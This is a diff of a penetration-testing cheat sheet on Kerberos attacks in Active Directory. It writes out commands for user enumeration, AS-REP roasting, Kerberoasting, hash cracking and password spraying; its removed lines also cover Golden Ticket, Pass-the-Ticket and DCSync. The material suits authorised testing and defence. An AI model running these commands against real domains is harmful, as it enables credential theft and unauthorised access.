@@ -1,217 +1,117 @@
-#  Kerberos / Active Directory Authentication — TCP/UDP 88
+# Kerberos
 
-Kerberos is the default authentication protocol in Active Directory environments. From a pentest perspective, Kerberos misconfigurations can allow **offline password cracking** via **AS-REP Roasting** and **Kerberoasting**, as well as **credential reuse and ticket abuse** once valid credentials are obtained.
+## Why It Matters
+
+Kerberos is central to Active Directory auth. In practice it often leads to:
+
+- username validation
+- password spraying
+- AS-REP roasting
+- Kerberoasting
+- ticket-based lateral movement after credential compromise
+
+## Workflow
+
+1. confirm the Kerberos service and domain
+2. validate usernames carefully
+3. identify roastable accounts
+4. spray only with lockout awareness
+5. use valid tickets and hashes to move into SMB, LDAP, WinRM, and other services
 
 ## Detection
-### nmap
-```
-nmap -p 88 -sV <IP>
+
+```bash
+nmap -p 88 -sV <ip>
+nc -vn <target> 88
 ```
 
-## Banner Grabbing
-```
-nc -vn target.com 88
-```
+Kerberos by itself is usually not the end goal. It is the auth fabric behind the rest of AD.
 
-## Connect
+## Step 1: Ticket Basics
 
-### kinit
-
-#### Request Ticket Granting Ticket
-```
+```bash
 kinit username@DOMAIN.LOCAL
-```
-
-#### With Password
-```
-echo 'password' | kinit username@DOMAIN.COM
-printf '%s' 'password' | kinit username@DOMAIN.COM
-```
-#### Check Tickets
-```
 klist
 ```
 
-## Username Enumeration 
+Once you have valid creds, ticket handling becomes part of your normal workflow.
 
-### kerbrute
-```
-kerbrute userenum --dc <DC_IP> -d DOMAIN.LOCAL users.txt
-```
+## Step 2: Username Enumeration
 
-### nmap
-```
-nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt target.com
+```bash
+kerbrute userenum --dc <dc_ip> -d DOMAIN.LOCAL users.txt
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt <target>
 ```
 
-### Manual User Enumeration
-```
-for user in $(cat users.txt); do
-  getTGT.py DOMAIN/$user -dc-ip target.com -no-pass 2>&1 | grep -v "KDC_ERR_PREAUTH_REQUIRED"
-done
+Use this carefully. It is useful for building a high-quality spray list.
 
-for user in $(cat users.txt); do
-  out=$(impacket-getTGT DOMAIN/$user -dc-ip <DC_IP> -no-pass 2>&1)
-  echo "$out" | grep -q "KDC_ERR_C_PRINCIPAL_UNKNOWN" && continue
-  echo "[+] Possible valid user: $user"
-done
-```
+## Step 3: AS-REP Roasting
 
-## Kerberoasting
+For accounts without pre-auth:
 
-- Kerberoasting exploits service accounts with SPNs by requesting tickets that can be cracked offline.
-
-### Request Service Tickets (SPNs)
-
-- Service Principal Names (SPNs) identify services running under specific accounts and are prime targets for Kerberoasting attacks.
-
-#### Impacket
-```
-impacket-GetUserSPNs DOMAIN/username:password -dc-ip <DC_IP>
-impacket-GetUserSPNs DOMAIN/username -hashes :NTLM_HASH -dc-ip <DC_IP>
-impacket-GetUserSPNs DOMAIN/username:password -dc-ip target.com -request -outputfile hashes.txt
-```
-
-#### Enumerate SPNs via LDAP with credentials (alternative)
-```
-ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w password \
-  -b "DC=example,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
-```
-
-### Crack Kerberos Tickets (TGS)
-
-#### Using Hashcat (Kerberos 5 TGS-REP etype 23)
-```
-hashcat -m 13100 hashes.txt rockyou.txt
-```
-#### John the Ripper
-```
-john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
-```
-#### From Windows with Rubeus
-```
-Rubeus.exe kerberoast /outfile:hashes.txt
-```
-
-### AS-REP Roasting (No Pre-Authentication)
-
-- Users with `DONT_REQ_PREAUTH` set -> AS-REP roastable users
-
-#### Impacket
-```
-GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip target.com -format hashcat
-impacket-GetNPUsers DOMAIN/ -dc-ip <DC_IP> -usersfile users.txt
-```
-
-#### ldapsearch (also in LDAP.md)
-```
-ldapsearch -x -H ldap://<DC_IP> -b "DC=example,DC=local" \
-  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
-  sAMAccountName
-```
-
-#### Crack AS-REP hashes
-```
+```bash
+impacket-GetNPUsers DOMAIN/ -dc-ip <dc_ip> -usersfile users.txt
 hashcat -m 18200 asrep_hashes.txt rockyou.txt
 ```
 
-## Password Spraying
+This is one of the cleanest Kerberos attack paths because cracking happens offline.
 
-### kerbrute
+## Step 4: Kerberoasting
+
+Identify service accounts with SPNs:
+
+```bash
+impacket-GetUserSPNs DOMAIN/username:password -dc-ip <dc_ip>
+impacket-GetUserSPNs DOMAIN/username:password -dc-ip <dc_ip> -request -outputfile hashes.txt
+hashcat -m 13100 hashes.txt rockyou.txt
 ```
+
+Service accounts often have weak human-managed passwords and privileged access.
+
+## Step 5: Password Spraying
+
+If spraying is in scope and lockout-aware:
+
+```bash
 kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt 'Password123!'
-```
-
-### crackmapexec
-```
 crackmapexec smb target.com -u users.txt -p 'Password123!' --continue-on-success
 ```
 
-### Multiple Passwords
-```
-for pass in 'Winter2024!' 'Spring2024!' 'Password123!'; do
-  kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt "$pass"
-done
-```
+Always consider lockout thresholds before spraying.
 
+## Step 6: Ticket Reuse And Lateral Movement
 
-## Golden Ticket Attack
+After obtaining tickets or creds:
 
-- Create forged TGT with stolen krbtgt hash to gain domain admin access.
+- use SMB
+- use WinRM
+- use LDAP
+- use remote execution where supported
 
-### Mimikatz
-```
-kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH /id:500
-```
+The value of Kerberos is often what it unlocks elsewhere.
 
-### Impacket
-```
-impacket-icketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX-XXX-XXX -domain DOMAIN.COM Administrator
-```
+## Pitfalls
 
-### Using Golden Tickets
-#### Set ticket
-```
-export KRB5CCNAME=Administrator.ccache
-```
-#### Access Any Resource
-```
-impacket-psexec.py DOMAIN/Administrator@target.com -k -no-pass
-```
+- spraying before checking lockout policy
+- focusing on advanced ticket abuse before exhausting roast and reuse paths
+- treating Kerberos as separate from LDAP, SMB, and WinRM
 
+## Reporting Notes
 
-## Pass-the-Ticket
+Capture:
 
-- Use stolen Kerberos tickets to authenticate without knowning passwords
+- valid usernames discovered
+- AS-REP or TGS hashes obtained
+- cracked service or user accounts
+- the downstream access enabled by Kerberos-derived credentials
 
-### Ticket Extraction and Conversion
+## Fast Checklist
 
-#### Export ticket from Windows
-```
-mimikatz "sekurlsa::tickets /export"
-```
-
-#### Convert .kirbi to .ccache
-```
-impacket-ticketConverter ticket.kirbi ticket.ccache
-```
-
-#### Use Stolen Ticket
-```
-export KRB5CCNAME=ticket.ccache
-impacket-psexec DOMAIN/username@target.com -k -no-pass
-```
-
-## Post-Exploitation
-
-### Ticket Extraction
-
-#### Windows
-
-##### Mimikatz
-```
-sekurlsa::tickets /export
-```
-#### Rubues
-```
-Rubeus.exe dump /service:krbtgt
-```
-
-#### Linux 
-```
-impacket-getTGT DOMAIN/username:password
-```
-
-### DCSync Attack
-- Extract password hashes from Domain Controller using DCSync technique.
-#### Mimikatz
-```
-lsadump::dcsync /user:DOMAIN\krbtgt
-lsadump::dcsync /user:DOMAIN\Administrator
-```
-
-#### Impacket
-```
-impacket-secretsdump DOMAIN/username:password@dc.domain.com
-secretsdump.py -just-dc DOMAIN/username:password@dc.domain.com
+```text
+1. Confirm Kerberos and domain context
+2. Build a clean user list
+3. Check AS-REP roasting
+4. Check Kerberoasting
+5. Spray carefully if allowed
+6. Use resulting creds or tickets on other AD services
 ```
